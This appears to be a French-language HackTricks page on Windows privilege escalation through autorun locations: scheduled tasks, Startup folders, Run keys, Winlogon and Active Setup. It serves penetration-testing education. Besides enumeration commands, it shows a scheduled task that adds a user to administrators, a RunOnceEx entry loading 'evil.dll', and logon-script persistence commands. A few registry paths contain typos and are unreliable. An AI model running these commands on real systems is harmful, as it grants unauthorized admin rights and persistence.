# Élévation de privilèges avec Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** peut être utilisé pour lancer des programmes au **démarrage**. Pour voir quels binaires sont configurés pour s’exécuter au démarrage, utilisez :

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Tâches planifiées

Les **tâches** peuvent être planifiées pour s’exécuter à une **fréquence précise**. Utilisez les commandes suivantes pour voir quels binaires sont planifiés pour s’exécuter :

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

Une tâche activée qui s’exécute en tant que SYSTEM mérite d’être examinée, même lorsque sa définition et son fichier d’action sont protégés. [Le Planificateur de tâches nécessite une autorisation d’exécution sur la tâche pour la lancer à la demande](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). Si un utilisateur à faibles privilèges dispose de cette autorisation, inspectez l’action exacte, en particulier les scripts PowerShell qui modifient les ACL d’Active Directory ou réinitialisent les paramètres de protection des comptes. Vérifiez le paramètre `AllowDemandStart` de la tâche ainsi que les entrées et les effets du script ; l’autorisation de lancer une tâche définie ne permet pas, à elle seule, l’exécution de code arbitraire.

## Dossiers

Tous les binaires situés dans les **dossiers de démarrage sont exécutés au démarrage**. Les dossiers de démarrage courants sont ceux énumérés ci-dessous, mais le dossier de démarrage est indiqué dans le registre. [Consultez cette page pour savoir où le trouver.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Une entrée Startup d’un utilisateur disposant de privilèges supérieurs peut lancer un script protégé qui ouvre régulièrement des fichiers dans un répertoire modifiable par un autre utilisateur. Vérifiez l’**identité réelle à l’ouverture de session** associée à l’entrée, le répertoire d’entrée du script et ses ACL, ainsi que l’action exacte, avant de considérer ce répertoire comme une voie d’escalade. En particulier, [`hh.exe` ouvre les fichiers HTML Help compilés (`.chm`)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program) ; un script qui lui transmet des fichiers fournis par l’appelant franchit une frontière de confiance du contenu, même s’il vérifie le nom du fichier ou ses premiers octets. [Les stratégies HTML Help peuvent restreindre les raccourcis exécutables](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands) : vérifiez donc la stratégie installée et le comportement du contenu accessible. Une extension `.chm` ou des octets magiques ne suffisent pas à prouver l’exécution de code avec des privilèges supérieurs. Examinez l’autorun, la ligne de commande du processus et les permissions du chemin sans ouvrir le fichier non fiable pendant l’énumération.

La même frontière de confiance du contenu existe lorsqu’une personne disposant de privilèges supérieurs **ouvre manuellement** un `.chm` depuis un dossier de documentation qu’un autre utilisateur peut remplacer. Vérifiez le fichier exact et les droits d’écriture sur son répertoire parent, l’identité réelle de l’afficheur et l’événement d’ouverture, ainsi que la stratégie HTML Help effective. Un dossier accessible en écriture ou une demande de révision de documentation ne prouve pas que l’utilisateur disposant de privilèges supérieurs a ouvert un contenu contrôlé par un attaquant.

> **À SAVOIR** : Les vulnérabilités de *path traversal* lors de l’extraction d’archives (comme celle exploitée dans WinRAR avant la version 7.13 – CVE-2025-8088) peuvent être utilisées pour **déposer directement des payloads dans ces dossiers Startup pendant la décompression**, entraînant l’exécution de code à la prochaine ouverture de session de l’utilisateur. Pour une analyse approfondie de cette technique, consultez :


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registre

> [!TIP]
> [Note à partir d’ici](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f) : l’entrée de registre **Wow6432Node** indique que vous utilisez une version 64 bits de Windows. Le système d’exploitation utilise cette clé pour afficher une vue distincte de HKEY_LOCAL_MACHINE\SOFTWARE pour les applications 32 bits exécutées sur les versions 64 bits de Windows.

### Exécutions

**Clés de registre AutoRun couramment connues** :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Les clés de registre **Run** et **RunOnce** sont conçues pour exécuter automatiquement des programmes chaque fois qu’un utilisateur se connecte au système. La ligne de commande attribuée comme valeur de données d’une clé est limitée à 260 caractères.<sup>[[2]](#references)</sup>

**Exécutions de services** (permettent de contrôler le démarrage automatique des services au démarrage) :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx :**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Sous Windows Vista et les versions ultérieures, les clés de registre **Run** et **RunOnce** ne sont pas générées automatiquement. Les entrées de ces clés peuvent soit lancer directement des programmes, soit les spécifier comme dépendances. Par exemple, pour charger un fichier DLL à l’ouverture de session, on peut utiliser la clé de registre **RunOnceEx** avec une clé « Depend ». Voici comment ajouter une entrée de registre qui exécute « C:\temp\evil.dll » au démarrage du système :<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1** : Si vous pouvez écrire dans l’une des clés de registre mentionnées dans **HKLM**, vous pouvez élever vos privilèges lorsqu’un autre utilisateur se connecte.

> [!TIP]
> **Exploit 2** : Si vous pouvez écraser l’un des binaires indiqués dans l’une des clés de registre de **HKLM**, vous pouvez le modifier pour y ajouter une backdoor lorsqu’un autre utilisateur se connecte et ainsi élever vos privilèges.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Chemin de démarrage

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Les raccourcis placés dans le dossier **Startup** déclenchent automatiquement le lancement de services ou d’applications lors de la connexion de l’utilisateur ou du redémarrage du système. L’emplacement du dossier **Startup** est défini dans le registre pour les portées **Local Machine** et **Current User**. Ainsi, tout raccourci ajouté à ces emplacements **Startup** spécifiés garantit le démarrage du service ou du programme associé après la connexion ou le redémarrage, ce qui constitue une méthode simple pour programmer l’exécution automatique de programmes.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Si vous pouvez écraser un dossier Shell [User] sous **HKLM**, vous pourrez le faire pointer vers un dossier que vous contrôlez et y placer une backdoor qui sera exécutée chaque fois qu’un utilisateur se connectera au système, permettant ainsi une élévation de privilèges.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Cette valeur de registre propre à l’utilisateur peut pointer vers un script ou une commande exécuté(e) lorsque cet utilisateur ouvre une session. Il s’agit principalement d’un mécanisme de **persistence**, car il ne s’exécute que dans le contexte de l’utilisateur concerné, mais il reste utile de la vérifier lors des activités de post-exploitation et de l’examen des autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Si vous pouvez modifier cette valeur pour l’utilisateur actuel, vous pouvez relancer l’exécution à sa prochaine ouverture de session interactive, sans avoir besoin de droits d’administrateur. Si vous pouvez la modifier dans la ruche d’un autre utilisateur, vous pouvez obtenir une exécution de code lorsque cet utilisateur ouvrira une session.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Notes :

- Préférez les chemins complets vers les fichiers `.bat`, `.cmd`, `.ps1` ou autres fichiers de lancement déjà accessibles en lecture par l’utilisateur cible.
- Cette persistance est maintenue après une déconnexion ou un redémarrage, jusqu’à la suppression de la valeur.
- Contrairement à `HKLM\...\Run`, cela n’accorde pas à lui seul une élévation de privilèges ; il s’agit d’une persistance à l’échelle de l’utilisateur.

### Clés Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

En règle générale, la clé **Userinit** est définie sur **userinit.exe**. Toutefois, si cette clé est modifiée, l’exécutable spécifié sera également lancé par **Winlogon** lors de l’ouverture de session de l’utilisateur. De même, la clé **Shell** est censée pointer vers **explorer.exe**, qui est le shell par défaut de Windows.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> Si vous pouvez écraser la valeur du registre ou le binaire, vous pourrez élever vos privilèges.

### Paramètres de stratégie

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Vérifiez la clé **Run**.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Modifier l’invite de commandes du mode sans échec

Dans le Registre Windows, sous `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, la valeur **`AlternateShell`** est définie par défaut sur `cmd.exe`. Cela signifie que lorsque vous choisissez « Mode sans échec avec invite de commandes » au démarrage (en appuyant sur F8), `cmd.exe` est utilisé. Cependant, il est possible de configurer votre ordinateur pour qu’il démarre automatiquement dans ce mode sans avoir à appuyer sur F8 et à le sélectionner manuellement.

Étapes pour créer une option de démarrage qui lance automatiquement le « Mode sans échec avec invite de commandes » :<sup>[[5]](#references)</sup>

1. Modifiez les attributs du fichier `boot.ini` pour supprimer les indicateurs lecture seule, système et caché : `attrib c:\boot.ini -r -s -h`
2. Ouvrez `boot.ini` pour le modifier.
3. Insérez une ligne comme celle-ci : `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Enregistrez les modifications dans `boot.ini`.
5. Rétablissez les attributs d’origine du fichier : `attrib c:\boot.ini +r +s +h`

- **Exploit 1 :** La modification de la clé de Registre **AlternateShell** permet de configurer un shell de commandes personnalisé, ce qui peut permettre un accès non autorisé.
- **Exploit 2 (autorisations d’écriture sur PATH) :** Des autorisations d’écriture sur n’importe quelle partie de la variable système **PATH**, en particulier avant `C:\Windows\system32`, permettent d’exécuter un `cmd.exe` personnalisé, qui pourrait servir de backdoor si le système démarre en mode sans échec.
- **Exploit 3 (autorisations d’écriture sur PATH et boot.ini) :** Un accès en écriture à `boot.ini` permet de configurer le démarrage automatique en mode sans échec, facilitant ainsi un accès non autorisé au prochain redémarrage.

Pour vérifier le paramètre **AlternateShell** actuel, utilisez ces commandes :

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Composant installé

Active Setup est une fonctionnalité de Windows qui **se lance avant que l’environnement de bureau soit entièrement chargé**. Elle donne la priorité à l’exécution de certaines commandes, qui doivent se terminer avant que la connexion de l’utilisateur se poursuive. Ce processus a lieu avant même le déclenchement d’autres entrées de démarrage, comme celles des sections Run ou RunOnce du registre.

Active Setup est géré par les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ces clés contiennent plusieurs sous-clés, chacune correspondant à un composant spécifique. Les valeurs des clés particulièrement intéressantes sont :

- **IsInstalled :**
  - `0` indique que la commande du composant ne sera pas exécutée.
  - `1` signifie que la commande sera exécutée une fois pour chaque utilisateur ; c’est le comportement par défaut si la valeur `IsInstalled` est absente.
- **StubPath :** définit la commande à exécuter par Active Setup. Il peut s’agir de n’importe quelle ligne de commande valide, par exemple le lancement de `notepad`.

**Informations de sécurité :**

- Modifier ou écrire dans une clé où **`IsInstalled`** est défini sur `"1"` et où un **`StubPath`** spécifique est présent peut entraîner l’exécution de commandes non autorisée, et potentiellement une élévation de privilèges.
- Modifier le fichier binaire référencé par une valeur **`StubPath`** peut également permettre une élévation de privilèges, si les autorisations sont suffisantes.

Pour examiner les configurations **`StubPath`** de tous les composants Active Setup, vous pouvez utiliser les commandes suivantes :

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Objets d'aide du navigateur

### Présentation des objets d'aide du navigateur (BHO)

Les objets d'aide du navigateur (BHO) sont des modules DLL qui ajoutent des fonctionnalités à Microsoft Internet Explorer. Ils se chargent dans Internet Explorer et Windows Explorer à chaque démarrage. Cependant, leur exécution peut être bloquée en définissant la clé **NoExplorer** sur 1, ce qui les empêche de se charger avec les instances de Windows Explorer.<sup>[[1]](#references)</sup>

Les BHO sont compatibles avec Windows 10 via Internet Explorer 11, mais ne sont pas pris en charge dans Microsoft Edge, le navigateur par défaut des versions plus récentes de Windows.

Pour examiner les BHO enregistrés sur un système, vous pouvez inspecter les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Chaque BHO est représenté dans le registre par son **CLSID**, qui sert d'identifiant unique. Des informations détaillées sur chaque CLSID sont disponibles sous `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Pour interroger les BHO dans le registre, vous pouvez utiliser les commandes suivantes :

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Extensions d’Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Notez que le registre contiendra une nouvelle entrée pour chaque DLL, représentée par le **CLSID**. Vous trouverez les informations sur le CLSID dans `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Pilotes de polices

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Commande d’ouverture

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Gestionnaires COM du menu contextuel

Les gestionnaires du menu contextuel d’Explorer sont des extensions shell enregistrées sous des clés telles que `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` et `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers`. La valeur par défaut d’un gestionnaire, ou parfois le nom de sa clé, est un CLSID. Suivez ce CLSID jusqu’à `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32` ; sa valeur par défaut indique le nom de la DLL chargée lors de l’appel du gestionnaire.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

Vérifiez les vues du registre 32 bits et 64 bits. `HKCR` fusionne les inscriptions de classes propres à l’utilisateur et celles à l’échelle de la machine ; vérifiez donc quelle clé sous-jacente un processus utilisera. Une identité à faibles privilèges capable de modifier une valeur `InprocServer32` à l’échelle de la machine peut rediriger un processus plus privilégié vers une autre DLL, mais cette élévation nécessite que le processus invoque le gestionnaire. Un chemin de DLL modifiable peut présenter un risque similaire, même si la valeur du registre elle-même est protégée.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Notez que tous les emplacements où vous pouvez trouver des autoruns ont **déjà été recherchés par**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Cependant, pour obtenir une **liste plus complète des fichiers exécutés automatiquement**, vous pouvez utiliser [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) de SysInternals :

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Plus

**Trouvez d’autres Autoruns similaires aux clés de registre dans** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Mécanismes courants de persistance des malwares](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Exécution automatique au démarrage ou à l’ouverture de session : clés de registre Run / dossier Startup](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Scripts d’initialisation au démarrage ou à l’ouverture de session : script d’ouverture de session (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Catégories de démarrage automatique (Dépannage avec les outils Windows Sysinternals, 2e édition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Comment ajouter une option de démarrage qui lance un shell alternatif ?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Bilan Metasploit 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [PR Metasploit n° 21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
